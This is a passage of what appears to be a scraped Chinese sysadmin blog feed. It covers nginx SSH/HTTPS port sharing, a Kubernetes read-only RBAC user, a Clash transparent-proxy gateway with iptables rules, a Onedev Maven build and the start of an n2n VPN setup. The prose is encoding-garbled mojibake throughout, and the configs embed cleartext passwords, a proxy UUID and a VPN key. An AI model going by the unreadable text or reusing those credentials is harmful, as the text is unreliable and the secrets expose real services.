https; 18 } 19 20 # SSH and SSL on the same port 21 server { 22 listen 443; 23 24 proxy_pass $upstream; 25 ssl_preread on; 26 } 27} æµ‹è¯•ä¸€ä¸‹ï¼š\n1curl -v https://192.168.8.110 2 3ssh 192.168.8.110 -p 443 è¿™æ ·å°±å¯ä»¥äº†ã€‚\n","date":"2021-11-09","img":"","permalink":"https://rendoumi.com/posts/20211109-nginx_multiple_port/","series":null,"tags":null,"title":"Nginxçš„ä¸€ä¸ªç«¯å£åŒæ—¶è·‘SSHå’ŒHTTPSæœåŠ¡"},{"categories":null,"content":"kubernetes è£…å¥½æ­£å¸¸è¿è¡Œä¸€æ®µæ—¶é—´åï¼Œä¼šå‡ºç°è¦æŠŠç ”å‘å’Œè¿ç»´æƒé™åˆ†å¼€çš„åœºæ™¯ï¼š\næ¯”å¦‚ï¼š\nç»™æŸä¸ªç”¨æˆ·æŸä¸€æŒ‡å®šåç§°ç©ºé—´ä¸‹çš„ç®¡ç†æƒé™ ç»™ç”¨æˆ·èµ‹äºˆé›†ç¾¤çš„åªè¯»æƒé™ â€¦ éå¸¸éº»çƒ¦ï¼Œæˆ‘ä»¬è¿™é‡Œä¸è®¨è®ºè¿‡å¤šçš„æ¦‚å¿µï¼Œä»è¿ç»´çš„è§’åº¦å‡ºå‘ï¼Œç®€å•å®ç”¨åŒ–\næˆ‘ä»¬éœ€è¦æ˜ç¡®ä¸‰ä¸ªRBACæœ€åŸºæœ¬çš„æ¦‚å¿µ\nRole: è§’è‰²ï¼Œå®ƒå®šä¹‰äº†ä¸€ç»„è§„åˆ™ï¼Œå®šä¹‰äº†ä¸€ç»„å¯¹Kubernetes APIå¯¹è±¡çš„æ“ä½œæƒé™ RoleBinding: å®šä¹‰äº†\u0026quot;è¢«ä½œç”¨è€…\u0026quot;å’Œ\u0026quot;è§’è‰²\u0026quot;çš„ç»‘å®šå…³ç³» Subject: è¢«ä½œç”¨è€…ï¼Œæ—¢å¯ä»¥æ˜¯\u0026quot;äºº\u0026quot;ï¼Œä¹Ÿå¯ä»¥æ˜¯æœºå™¨ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥æ˜¯ Kubernetes ä¸­å®šä¹‰çš„ç”¨æˆ·(ServiceAccountä¸»è¦è´Ÿè´£kuberneteså†…ç½®ç”¨æˆ·) æˆ‘ä»¬çš„æ“ä½œè¿‡ç¨‹æµç¨‹å¦‚ä¸‹ï¼Œé¦–å…ˆåˆ›å»ºå®¢æˆ·ç«¯è¯ä¹¦ï¼›å…¶æ¬¡åˆ›å»ºRoleè§’è‰²ï¼›å†åˆ›å»ºRoleBindingï¼ŒæŠŠSubjectå’ŒRoleç»‘å®šï¼Œå°±å®Œäº‹äº†ï¼›æœ€åä¸€æ­¥æ˜¯ç”Ÿæˆ kubectl çš„é…ç½®æ–‡ä»¶ã€‚\nä¸€ã€åˆ›å»ºå®¢æˆ·ç«¯è¯ä¹¦ æˆ‘ä»¬ä»¥å·²å»ºå¥½çš„é˜¿é‡Œ ACK ä¸ºä¾‹ï¼Œæˆ–è€…è‡ªå»ºå¥½çš„ Kubernetes ä¹Ÿè¡Œï¼›ç¡®å®šå·²ç»æœ‰äº† .kube/config é…ç½®æ–‡ä»¶ï¼Œæ‹¥æœ‰é›†ç¾¤æœ€é«˜æƒé™ï¼Œå¹¶ä¸”å¯ä»¥æ­£å¸¸æ‰§è¡Œ kubectl å‘½ä»¤ã€‚\né¦–å…ˆæ˜¯ç”Ÿæˆè¯ä¹¦ï¼Œå¹¶å‘é›†ç¾¤æå‡ºè¯ä¹¦è¯·æ±‚å¹¶ç­¾å‘ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š\n1#!/bin/sh 2 3useraccount=reader 4 5openssl req -new -newkey rsa:4096 -nodes -keyout $useraccount-k8s.key -out $useraccount-k8s.csr -subj \u0026#34;/CN=$useraccount/O=devops\u0026#34; 6csr=$(cat $useraccount-k8s.csr | base64 | tr -d \u0026#39;\\n\u0026#39;) 7cat \u0026lt;\u0026lt; EOF \u0026gt; k8s-csr.yaml 8apiVersion: certificates.k8s.io/v1beta1 9kind: CertificateSigningRequest 10metadata: 11 name: $useraccount-k8s-access 12spec: 13 groups: 14 - system:authenticated 15 request: $csr 16 usages: 17 - client auth 18EOF 19 20 21kubectl create -f k8s-csr.yaml 22kubectl certificate approve $useraccount-k8s-access 23 24kubectl get csr $useraccount-k8s-access -o jsonpath=\u0026#39;{.status.certificate}\u0026#39; | base64 --decode \u0026gt; $useraccount-k8s-access.crt 25kubectl config view -o jsonpath=\u0026#39;{.clusters[0].cluster.certificate-authority-data}\u0026#39; --raw | base64 --decode - \u0026gt; k8s-ca.crt è§£é‡Šä¸€ä¸‹ï¼šæˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªç”¨æˆ·CN=readerï¼Œç„¶åå‘é›†ç¾¤å‘é€äº†è¯ä¹¦è¯·æ±‚å¹¶ç­¾å‘ï¼Œæœ€ç»ˆä»é›†ç¾¤è·å¾—äº† reader-k8s-access.crt çš„å®¢æˆ·ç«¯è¯ä¹¦å’Œ k8s-ca.crt çš„ CA è¯ä¹¦ã€‚\nk8s-csr.yaml å’Œ reader-k8s.csr éƒ½æ˜¯ä¸­é—´äº§ç‰©ï¼Œæœ€ç»ˆæˆ‘ä»¬æœ‰äº†å®¢æˆ·ç«¯ç§é’¥ reader-k8s.key ï¼Œå®¢æˆ·ç«¯è¯ä¹¦ reader-k8s-access.crt ï¼ŒCA è¯ä¹¦ k8s-ca.crt è¿™ä¸‰ä¸ªæœ‰ç”¨çš„æ–‡ä»¶ã€‚\näºŒã€åˆ›å»º Role è§’è‰² 1cat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; role.yaml 2apiVersion: rbac.authorization.k8s.io/v1 3kind: Role 4metadata: 5 name: role-pods_reader 6 namespace: default 7rules: 8- apiGroups: 9 - \u0026#34;\u0026#34; 10 resources: 11 - pods 12 - pods/log 13 verbs: 14 - get 15 - list 16 - watch 17EOF 18 19kubectl apply -f role.yaml è§£é‡Šï¼šæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ª role è§’è‰²ï¼Œåå­—å«åš role-pods_readerï¼Œæ‰€å±å‘½åç©ºé—´æ˜¯ default ï¼Œå®ƒå¯¹ pods å’Œ pods/log æœ‰ get ã€listã€watchçš„æƒé™ï¼Œä¹Ÿå°±æ˜¯è¯´role-pods_reader å¯ä»¥æŸ¥çœ‹ default ç©ºé—´çš„ pods å’Œ pods çš„æ—¥å¿—ã€‚\nä¸‰ã€åˆ›å»º Rolebinding 1cat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; rolebinding.yaml 2apiVersion: rbac.authorization.k8s.io/v1 3kind: RoleBinding 4metadata: 5 name: rolebinding-default_pods_reader 6 namespace: default 7roleRef: 8 apiGroup: rbac.authorization.k8s.io 9 kind: Role 10 name: role-pods_reader 11subjects: 12- apiGroup: rbac.authorization.k8s.io 13 kind: User 14 name: reader 15EOF 16 17kubectl apply -f rolebinding.yaml è§£é‡Šï¼šæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ª rolebindingï¼Œåå­—å«åš rolebinding-default_pods_readerï¼ŒåŒæ ·æ‰€å±å‘½åç©ºé—´æ˜¯ defaultï¼Œå®ƒç»‘äº†ä¸¤ä¸ªä¸œè¥¿ï¼Œä¸€ä¸ªæ˜¯ roleï¼Œå°±æ˜¯ä¸Šé¢ç¬¬äºŒæ­¥åˆ›å»ºçš„ role-pods_readerï¼›å¦ä¸€ä¸ªæ˜¯ subjectï¼Œå¯¹åº”äº†ä¸€ä¸ªç”¨æˆ·ï¼Œå°±æ˜¯æˆ‘ä»¬ç¬¬ä¸€æ­¥åˆ›å»ºçš„é‚£ä¸ª readerã€‚\nå››ã€ç”Ÿæˆ kubectl é…ç½®æ–‡ä»¶ 1#!/bin/sh 2useraccount=reader 3namespace=default 4 5kubectl config set-cluster $(kubectl config view -o jsonpath=\u0026#39;{.clusters[0].name}\u0026#39;) --server=$(kubectl config view -o jsonpath=\u0026#39;{.clusters[0].cluster.server}\u0026#39;) --certificate-authority=k8s-ca.crt --embed-certs --kubeconfig=$useraccount-k8s-config 6 7kubectl config set-credentials $useraccount --client-certificate=$useraccount-k8s-access.crt --client-key=$useraccount-k8s.key --embed-certs --kubeconfig=$useraccount-k8s-config 8 9kubectl config set-context $useraccount --cluster=$(kubectl config view -o jsonpath=\u0026#39;{.clusters[0].name}\u0026#39;) --namespace=$namespace --user=$useraccount --kubeconfig=$useraccount-k8s-config 10 11kubectl config use-context $useraccount --kubeconfig=$useraccount-k8s-config è§£é‡Šï¼šä¸Šé¢çœ‹èµ·æ¥å¾ˆå¤æ‚ï¼Œå…¶å®å°±æ˜¯å››æ­¥ï¼Œåœ¨é…ç½®æ–‡ä»¶é‡Œè®¾ç½® cluster ã€è®¾ç½® credentials è¯ä¹¦ã€è®¾ç½® context ä¸Šä¸‹æ–‡ã€è®¾ç½®å½“å‰ä¸Šä¸‹æ–‡ã€‚\nå®Œäº‹åä¼šäº§ç”Ÿä¸€ä¸ªå®Œæ•´çš„ reader-k8s-config æ–‡ä»¶ï¼Œå¦‚ä¸‹ï¼š\näº”ã€æµ‹è¯• æˆ‘ä»¬éªŒè¯ä¸€ä¸‹ï¼š\n1KUBECONFIG=reader-k8s-config kubectl get pods 2 3KUBECONFIG=reader-k8s-config kubectl auth can-i delete pods 4 5KUBECONFIG=reader-k8s-config kubectl auth can-i delete svc è¿™æ ·ä¸€ä¸ªå¯¹ default ç©ºé—´çš„åªè¯»ç”¨æˆ·å°±å»ºç«‹å¥½äº†\nå…­ã€é›†ç¾¤åªè¯»ç”¨æˆ· æˆ‘ä»¬è¿™é‡Œç»™å‡ºé›†ç¾¤åªè¯»ç”¨æˆ·çš„ roleï¼Œå‘½å role-cluster_reader\n1kubectl apply -f - \u0026lt;\u0026lt;EOF 2apiVersion: rbac.authorization.k8s.io/v1 3kind: ClusterRole 4metadata: 5 name: role-cluster_reader 6rules: 7- apiGroups: 8 - \u0026#34;\u0026#34; 9 resources: 10 - nodes 11 - pods 12 - pods/exec 13 - pods/log 14 - services 15 - configmaps 16 - secrets 17 - serviceaccounts 18 - endpoints 19 verbs: 20 - get 21 - list 22 - watch 23- apiGroups: 24 - apps 25 resources: 26 - deployments 27 - replicasets 28 - daemonsets 29 - statefulsets 30 verbs: 31 - get 32 - list 33 - watch 34- apiGroups: 35 - batch 36 resources: 37 - jobs 38 - cronjobs 39 verbs: 40 - get 41 - list 42 - watch 43EOF ä»¥åŠ rolebindingï¼Œè¿˜æ˜¯ç»‘åˆ°ç¬¬ä¸€æ­¥çš„ç”¨æˆ· reader çš„ä¾‹å­\n1kubectl apply -f - \u0026lt;\u0026lt;EOF 2apiVersion: rbac.authorization.k8s.io/v1 3kind: ClusterRoleBinding 4metadata: 5 name: rolebinding-cluster_reader 6roleRef: 7 apiGroup: rbac.authorization.k8s.io 8 kind: ClusterRole 9 name: role-cluster_reader 10subjects: 11- apiGroup: rbac.authorization.k8s.io 12 kind: User 13 name: reader 14EOF ç”Ÿæˆé…ç½®æ–‡ä»¶çš„æ­¥éª¤è·Ÿä¸Šä¸€æ­¥æ˜¯ä¸€æ ·çš„ã€‚\nä»ä¸Šé¢å¤§å®¶å¯ä»¥çœ‹åˆ°ï¼Œå…¶å®æœ€ä¸»è¦çš„å°±æ˜¯ role çš„ yaml æ–‡ä»¶ï¼Œé‡Œé¢æ§åˆ¶ç€åˆ°åº•æœ‰æ€ä¹ˆæ ·çš„æƒé™ã€‚\n","date":"2021-11-09","img":"","permalink":"https://rendoumi.com/posts/20211109-k8s_rbac/","series":null,"tags":null,"title":"Kubernetesåˆ›å»ºæ™®é€šè´¦å·"},{"categories":null,"content":"æ²¡å•ŠåŠæ³•ï¼Œç¿»å¢™ç¿»å¢™è¿˜æ˜¯ç¿»å¢™ã€‚\nä¸Šæ¸¸æœ‰è‹¥å¹² trojian ã€v2ray ã€sock5 ã€httpå„ç§å„æ ·çš„ä»£ç†ï¼Œè¿™æ ·å¤šç§çš„é€‰æ‹©ï¼Œé‚£ä¹ˆå°±è£…ä¸€ä¸ª clash å®¢æˆ·ç«¯å°±å¯ä»¥å…¨æ¥ç®¡äº†ã€‚\nè¯´ä¸‹æˆ‘ä»¬çš„åšæ³•ï¼šæ‰¾ä¸ªå°Linuxåšæ—è·¯ç”±ï¼ŒDNSå’Œç½‘å…³éƒ½è®¾ç½®åœ¨è¿™å°æœºå™¨ä¸Šï¼Œå±€åŸŸç½‘å†…çš„æœºå™¨éƒ½é€šè¿‡è¿™å°ä¸Šç½‘ã€‚\næˆ‘ä»¬ç”¨åˆ°çš„æ˜¯ clash çš„ Tproxy redir-host å’Œ udp-proxy æ¨¡å¼ï¼Œè¿™ç§æ¨¡å¼æ¯”è¾ƒå¼ºå¤§ã€‚ç”¨å°±ç”¨æœ€å¼ºå¤§çš„ã€‚\nå®‰è£…å¾ˆç®€å•ï¼Œæ“ä½œç³»ç»Ÿ centos æˆ–è€… ubuntu éƒ½è¡Œï¼Œé¡¹ç›®åœ°å€ï¼š\nhttps://github.com/Dreamacro/clash è¯´æ˜ä¹¦ï¼š\nhttps://lancellc.gitbook.io/clash/clash-config-file/proxy-groups/load-balance é¦–å…ˆä¸‹è½½äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç°åœ¨ç‰ˆæœ¬æ˜¯ v1.7.1ï¼Œè§£å‹åæ”¾åˆ° /usr/local/bin ç›®å½•ä¸‹\n1wget https://github.com/Dreamacro/clash/releases/download/v1.7.1/clash-linux-amd64-v1.7.1.gz 2gzip -d clash-linux-amd64-v1.7.1.gz 3chmod 755 clash-linux-amd64-v1.7.1 4mv clash-linux-amd64-v1.7.1 /usr/local/bin ç„¶åç”Ÿæˆ clash.service\n1cat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /etc/systemd/system/clash.service 2[Unit] 3Description=clash service 4After=network.target 5 6[Service] 7Type=simple 8User=root 9ExecStart=/usr/local/bin/clash-linux-amd64-v1.7.1 10Restart=on-failure # or always, on-abort, etc 11 12[Install] 13WantedBy=multi-user.target 14EOF ç„¶åæœ€é‡è¦çš„ï¼Œå°±æ˜¯é…ç½®æ–‡ä»¶äº†\næˆ‘è¿™é‡Œè¿™ä¸ªæ—è·¯ç”±çš„è®¾å¤‡ IP åœ°å€æ˜¯ 192.168.2.2ï¼Œç½‘å¡è®¾å¤‡æ˜¯ enp2s0\nä¸‹å–å¼„\n1# httpçš„ä»£ç†ç«¯å£ 2port: 7890 3#mixed-port: 7890 4socks-port: 7891 5redir-port: 7892 6tproxy-port: 7893 7 8ipv6: false 9 10allow-lan: true 11bind-address: \u0026#39;192.168.2.2\u0026#39; 12interface-name: enp2s0 13 14mode: rule 15log-level: info 16external-controller: 0.0.0.0:9090 17secret: \u0026#34;Fuck2021\u0026#34; 18external-ui: dashboard 19 20profile: 21 store-selected: false 22 tracing: true 23 24 25hosts: 26 # æŠŠcantvçš„åŸŸåè§£æå±è”½æ‰ï¼Œç¦æ­¢å®ƒè‡ªåŠ¨å‡çº§ 27 \u0026#39;tms.can.cibntv.net\u0026#39;: 0.0.0.0 28 29dns: 30 enable: true 31 listen: 0.0.0.0:1053 32 enhanced-mode: redir-host # or fake-ip 33 nameserver: 34 - \u0026#39;114.114.114.114\u0026#39; 35 - \u0026#39;223.5.5.5\u0026#39; 36 fallback: 37 - 208.67.220.220:5353 38 - 208.67.222.222:5353 39 - 101.6.6.6:5353 40 41proxies: 42 - name: \u0026#34;trojan1\u0026#34; 43 type: trojan 44 server: www.linuxboy.net 45 port: 443 46 password: Fuck2021 47 sni: www.linuxboy.net 48 skip-cert-verify: true 49 50 - name: \u0026#34;vmess1\u0026#34; 51 type: vmess 52 server: 101.59.201.93 53 port: 41555 54 uuid: 7a17ae5e-fb86-42e2-abd4-b8c33cfabcd 55 alterId: 64 56 cipher: auto 57 58proxy-groups: 59 - name: Proxy 60 type: select 61 proxies: 62 - trojan 63 64 - name: \u0026#34;auto\u0026#34; 65 type: url-test 66 proxies: 67 - vmess1 68 - trojan1 69 url: \u0026#39;http://www.gstatic.com/generate_204\u0026#39; 70 interval: 300 71 72rules: 73 - DOMAIN-SUFFIX,v2ex.com,Proxy 74 - DOMAIN-SUFFIX,t66y.com,Proxy 75 - DOMAIN-SUFFIX,ycombinator.com,Proxy 76 - DOMAIN-SUFFIX,reddit.com,Proxy 77 - DOMAIN-KEYWORD,amazon,Proxy 78 - DOMAIN-KEYWORD,google,Proxy 79 - DOMAIN-KEYWORD,gmail,Proxy 80 - DOMAIN-KEYWORD,youtube,Proxy 81 - DOMAIN-KEYWORD,facebook,Proxy 82 - DOMAIN-SUFFIX,fb.me,Proxy 83 - DOMAIN-SUFFIX,fbcdn.net,Proxy 84 - DOMAIN-KEYWORD,twitter,Proxy 85 - DOMAIN-KEYWORD,instagram,Proxy 86 - DOMAIN-KEYWORD,dropbox,Proxy 87 - DOMAIN-SUFFIX,twimg.com,Proxy 88 - DOMAIN-KEYWORD,blogspot,Proxy 89 - DOMAIN-SUFFIX,youtu.be,Proxy 90 - DOMAIN-KEYWORD,whatsapp,Proxy 91 - SRC-IP-CIDR,192.168.1.0/32,DIRECT 92 - SRC-IP-CIDR,192.168.2.0/32,DIRECT 93 - IP-CIDR,127.0.0.0/8,DIRECT 94 - GEOIP,CN,DIRECT 95 - MATCH,Proxy è§£é‡Šä¸€ä¸‹ï¼šproxy å®šä¹‰äº†ä¸¤ä¸ªä»£ç†ï¼Œä¸€ä¸ªæ˜¯ trojanï¼Œä¸€ä¸ªæ˜¯ v2rayã€‚ç„¶åå†é›†åˆæˆç»„ï¼Œä¸€ä¸ªç»„å« Proxyï¼Œ æ˜¾å¼æŒ‡å®šç”¨ trojanï¼›å¦ä¸€ä¸ªç»„å« autoï¼Œæ ¹æ® vmess1 å’Œ trojan1 è®¿é—® http://www.gstatic.com/generate_204 çš„é¡µé¢é€Ÿåº¦ï¼Œè°å¿«å°±ç”¨è°ï¼Œç¼ºçœ300ç§’ä¼šè®¿é—®ä¸€æ¬¡è¿™ä¸ªé¡µé¢æ¥å†³å®šå“ªä¸ªä»£ç†å¿«ã€‚\nå‰©ä¸‹çš„ rules å°±å¾ˆç®€å•ï¼ŒæŠŠè‡ªå·±çŸ¥é“è¦è®¿é—®çš„åŸŸåæ”¾åˆ°ä»£ç†ä¸­å»ï¼Œç„¶åæŠŠå±€åŸŸç½‘çš„ IP æ®µæ”¾è¿› DIRECT ç›´æ¥è®¿é—®ï¼Œæœ€å GEO IP ä¸æ˜¯ä¸­å›½çš„ç”± Proxy å…œåº•ã€‚\nç½‘ä¸Šæœ‰ä¸€å¤§å †è§„åˆ™ï¼Œå…«æˆ’çš„å»ºè®®æ˜¯ä¸è¦å»å­¦ï¼Œè§„åˆ™è¶Šå¤šè¶Šæ…¢ï¼Œä½ è‡ªå·±çŸ¥é“è¦è®¿é—®ä»€ä¹ˆç½‘ç«™éœ€è¦ç¿»å¢™ï¼ŒåŠ è¿›å»å°±å¥½äº†ã€‚å¼„ä¸€å †ï¼Œè‡ªå·±çœ‹ç€éƒ½å¤´è’™\næœ€åæˆ‘ä»¬åœ¨ rc.local æ”¾å…¥ä»¥ä¸‹ iptable å†…å®¹ï¼Œå°±å¯ä»¥äº†\n1### 2#clash 3ip rule add fwmark 1 table 100 4ip route add local 0.0.0.0/0 dev lo table 100 5 6# CREATE TABLE 7iptables -t mangle -N clash 8 9# RETURN LOCAL AND LANS 10iptables -t mangle -A clash -d 0.0.0.0/8 -j RETURN 11iptables -t mangle -A clash -d 10.0.0.0/8 -j RETURN 12iptables -t mangle -A clash -d 100.64.0.0/10 -j RETURN 13iptables -t mangle -A clash -d 127.0.0.0/8 -j RETURN 14iptables -t mangle -A clash -d 169.254.0.0/16 -j RETURN 15iptables -t mangle -A clash -d 172.16.0.0/12 -j RETURN 16iptables -t mangle -A clash -d 192.168.0.0/16 -j RETURN 17iptables -t mangle -A clash -d 224.0.0.0/4 -j RETURN 18iptables -t mangle -A clash -d 240.0.0.0/4 -j RETURN 19 20# whitelist China ip. 21# iptables -t mangle -A clash -m set --match-set china dst -j RETURN 22 23# FORWARD ALL 24iptables -t mangle -A clash -p udp -j TPROXY --on-port 7893 --tproxy-mark 1 25iptables -t mangle -A clash -p tcp -j TPROXY --on-port 7893 --tproxy-mark 1 26 27# REDIRECT 28iptables -t mangle -A PREROUTING -j clash 29 30# hijack DNS to Clash 31iptables -t nat -N CLASH_DNS 32iptables -t nat -F CLASH_DNS 33iptables -t nat -A CLASH_DNS -p udp -j REDIRECT --to-port 1053 34iptables -t nat -I PREROUTING -p udp --dport 53 -j CLASH_DNS æœ€åå¯åŠ¨clash\n1systemctl start clash ","date":"2021-11-08","img":"","permalink":"https://rendoumi.com/posts/20211108-clash/","series":null,"tags":null,"title":"Clashçš„æ­å»ºæ•™ç¨‹"},{"categories":null,"content":"ä¸Šç¯‡ç®€å•ä»‹ç»äº† onedev ï¼Œè¿™ç¯‡æˆ‘ä»¬å…·ä½“æ‹¿ä¸ª java spring çš„é¡¹ç›®æ¥å®é™…ç¼–è¯‘ä¸€ä¸‹\né¦–å…ˆå¿…é¡»ç¡®è®¤ç¯å¢ƒï¼š\nonedev å’Œ agent éƒ½æ˜¯ç”¨ root å®‰è£…è¿è¡Œçš„ï¼Œç„¶åå·²ç»å®‰è£…äº† dockerï¼Œä¸” selinux è®¾ç½®ä¸º disabledï¼Œå¦åˆ™ä¼šå‡ºæƒé™éº»çƒ¦ã€‚\næˆ‘ä»¬ç”¨çš„ä¾‹å­æ˜¯ spring çš„ petclinicï¼Œæ­£å¸¸çš„ build çš„æ­¥éª¤å¦‚ä¸‹ï¼š\n1git clone https://github.com/spring-projects/spring-petclinic.git 2cd spring-petclinic 3./mvnw package æˆ‘ä»¬é¦–å…ˆåœ¨ onedev çš„ projects æ–°å»ºä¸€ä¸ªé¡¹ç›® spring-boot\nç„¶ååˆ° clone ä¸‹æ¥çš„æºä»£ç ç›®å½•ä¸‹\n1cd spring-petclinic 2 3git init 4git add . 5git commit -m \u0026#34;Spring boot demo project\u0026#34; 6 7git remote add origin http://192.168.86.101:6610/spring-boot 8git push --set-upstream origin master è¿™æ ·å°±å¯ä»¥åœ¨ spring-boot é‡Œçœ‹åˆ°ä»£ç äº†\nç„¶åçœ‹ä¸Šå›¾ï¼Œæœ‰ä¸ªç´«è‰²ç¯æ³¡ï¼ŒEnable build support by adding.onedev-buildspec.ymlï¼Œç‚¹é‚£ä¸ªé“¾æ¥\næˆ‘ä»¬å¢åŠ ä¸€ä¸ª build çš„æ­¥éª¤ï¼Œé‡Œé¢å†å¢åŠ ä¸¤ä¸ª jobï¼Œä¸€ä¸ªæ˜¯ Get code ï¼Œä¸€ä¸ªæ˜¯ build\nç¬¬ä¸€æ­¥è‚¯å®šæ˜¯æŠŠä»£ç æ‹¿ä¸‹æ¥ï¼Œé€‰æ‹© Checkout Code ï¼Œå‘½åä¸º Get code ï¼Œç„¶åå…¶ä»–ä¿æŒç¼ºçœé…ç½®ï¼Œä¿å­˜\nç¬¬äºŒæ­¥å°±æ˜¯ build ä»£ç ï¼Œé€‰æ‹© Execute Shell/Batch Commandsï¼Œç„¶åå®é™…æ˜¯å¯åŠ¨äº†ä¸€ä¸ª docker é•œåƒæ¥æ‰§è¡Œ build çš„è¿‡ç¨‹\nImage å¡«å…¥ï¼šmaven:3.5-jdk-8-alphine\nCommands å¡«å…¥ï¼š\n1unset MAVEN_CONFIG 2cat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /root/.m2/settings.xml 3\u0026lt;settings\u0026gt; 4 \u0026lt;proxies\u0026gt; 5 \u0026lt;proxy\u0026gt; 6 \u0026lt;id\u0026gt;default\u0026lt;/id\u0026gt; 7 \u0026lt;active\u0026gt;true\u0026lt;/active\u0026gt; 8 \u0026lt;protocol\u0026gt;http\u0026lt;/protocol\u0026gt; 9 \u0026lt;host\u0026gt;192.168.1.10\u0026lt;/host\u0026gt; 10 \u0026lt;port\u0026gt;3128\u0026lt;/port\u0026gt; 11 \u0026lt;/proxy\u0026gt; 12 \u0026lt;/proxies\u0026gt; 13\u0026lt;/settings\u0026gt; 14EOF 15./mvnw package è§£é‡Šä¸€ä¸‹ï¼Œmaven:3.5-jdk-8-alphine è¿™ä¸ªé•œåƒï¼Œå¦‚æœåœ¨é‡Œé¢æ‰§è¡Œ mvnw package ï¼Œä¼šæŠ¥é”™ repository çš„é”™ï¼Œæ‰€ä»¥å¿…é¡»æŠŠ MAVEN_CONFIG çš„ç¯å¢ƒå˜é‡ç»™åˆ é™¤ï¼Œå¦å¤–æ•´ä¸ª build è¿‡ç¨‹ä¼šå»æ‹‰ N å¤šåŒ…å’Œé…ç½®ï¼Œå¤§æ¦‚200å¤šå…†ï¼Œå¦‚æœä¸ç¿»å¢™ï¼ŒåŸºæœ¬æ˜¯å¤±è´¥ã€‚æ‰€ä»¥è¿™é‡Œå¼ºåˆ¶ mvn ä½¿ç”¨äº†ä»£ç†ï¼ï¼ï¼å¦åˆ™ build ä¸€å¤©éƒ½ä¸ä¼šæˆåŠŸã€‚\nç¬¬ä¸‰æ­¥æ˜¯é…ç½® mvn repositoryçš„ç¼“å­˜ï¼Œå¤§å®¶ä¸æƒ³æ¯æ¬¡buildéƒ½å»ä¸‹ä¸€éä¾èµ–åŒ…å§ï¼Œåœ¨ More Settings è®¾ç½®\nåœ¨Cachesé‡Œå¡«å…¥ï¼š\nkey: maven-cache\npath: /root/.m2/repository\nç„¶åæ‰§è¡Œ Build , ç„¶åç­‰å¾…ï¼Œç¬¬ä¸€æ¬¡æ—¶é—´ä¼šå¾ˆé•¿ï¼Œç»ˆäº Successful äº†\næ¥ä¸‹æ¥çš„æ­¥éª¤å°±å¯ä»¥ç”¨ Dockerfile ç”Ÿæˆé•œåƒï¼Œç„¶åæ¨åˆ° Harborï¼Œå†ä¸‹è½½æˆ–è€… gitopsä¸‹è½½æ¥å„ç§ yaml æ–‡ä»¶ï¼Œæ‹‰ kubectl å’Œé…ç½®æ–‡ä»¶ï¼Œå°±å¯ä»¥æ¨é€åˆ° kubernetes äº†ã€‚\nè¡¥å……ä¸€ä¸‹ï¼Œåœ¨åˆ«çš„åœ°æ–¹çªç„¶çœ‹åˆ°æœ‰ maven çš„é˜¿é‡Œé•œåƒåœ°å€ï¼Œè®°å½•ä¸€ä¸‹ï¼š\n1 \u0026lt;mirror\u0026gt; 2 \u0026lt;id\u0026gt;alimaven\u0026lt;/id\u0026gt; 3 \u0026lt;name\u0026gt;aliyun maven\u0026lt;/name\u0026gt; 4 \u0026lt;url\u0026gt;http://maven.aliyun.com/nexus/content/groups/public/\u0026lt;/url\u0026gt; 5 \u0026lt;mirrorOf\u0026gt;*\u0026lt;/mirrorOf\u0026gt; 6 \u0026lt;/mirror\u0026gt; ","date":"2021-11-08","img":"","permalink":"https://rendoumi.com/posts/20211108-onedev_maven/","series":null,"tags":null,"title":"Onedevæ„å»ºä¸€ä¸ªå®é™…java Springåº”ç”¨"},{"categories":null,"content":"vpnçš„æ­å»ºä¸€ç›´æ˜¯ä¸€ä¸ªéš¾è§£çš„é¢˜ç›®ï¼Œopenvpnã€ipsecã€tinc éƒ½åœ¨ç”¨ï¼Œéƒ½ä¸å¤Ÿç®€æ´ã€‚\nn2n æ˜¯ä¸€ç§ peer to peer ç«¯åˆ°ç«¯çš„ vpnï¼Œæ­å»ºèµ·æ¥éå¸¸ç®€å•æ–¹ä¾¿ã€‚å¿…å¤‡åˆ©å™¨\né¦–å…ˆäº†è§£ä¸€ä¸‹æ¦‚å¿µ\nn2n çš„ vpn åˆ†ä¸ºä¸¤ç§è§’è‰²ï¼ŒSupernode è¶…çº§èŠ‚ç‚¹å’Œ Edgenode è¾¹ç¼˜èŠ‚ç‚¹ã€‚\nå¾ˆç®€å•ï¼ŒSupernode æœ€å¥½æ˜¯å…¬ç½‘åœ°å€ï¼Œéœ€è¦å¼€æ”¾ç«¯å£ä¾›å…¶å®ƒèŠ‚ç‚¹è¿æ¥ä¸Šæ¥ï¼›å‰©ä½™çš„ Edgenode å¯ä»¥æ²¡æœ‰å…¬ç½‘åœ°å€ï¼Œå„ä¸ª Edgenode è¾¹ç¼˜èŠ‚ç‚¹ä¹‹é—´ä¼šå°è¯•ç»•è¿‡ Supernode ç›´æ¥è¿æ¥ã€‚è¿™å¤§å¤§æé«˜äº†èŠ‚ç‚¹ä¹‹é—´é€šè®¯çš„æ•ˆç‡ã€‚é€šè®¯æ˜¯åŠ å¯†çš„ï¼Œéå¸¸å®‰å…¨ã€‚\nå®‰è£…çš„è¯å®Œå…¨ä¸ç”¨å®‰è£…ï¼Œç›´æ¥ä¸€ä¸ªå‘½ä»¤å°±æå®šäº†ã€‚\nhttps://github.com/ntop/n2n å¼„å‡ºä¸¤ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ supernode å’Œ edge å°±å¥½äº†\nè¶…çº§èŠ‚ç‚¹ï¼š\n1/usr/local/bin/supernode -p 11111 -v è¾¹ç¼˜èŠ‚ç‚¹ï¼š\n1/usr/local/bin/edge -d n2n0 -c ThisisaSecret2012 -k Fuck2020 -a 192.168.0.2 -l 41.22.59.112:11111 -f å‚æ•°è§£é‡Šï¼š\n-d ç”Ÿæˆçš„è™šæ‹Ÿç½‘å¡çš„å‘½å -c æŸç»„vpnèŠ‚ç‚¹çš„å£ä»¤ã€‚å¤§å®¶çœ‹åˆ°å¯åŠ¨ supernode çš„æ—¶å€™æ²¡æœ‰ä»»ä½•å‚æ•°ï¼Œsupdernode åªè´Ÿè´£è½¬å‘ã€‚supernode 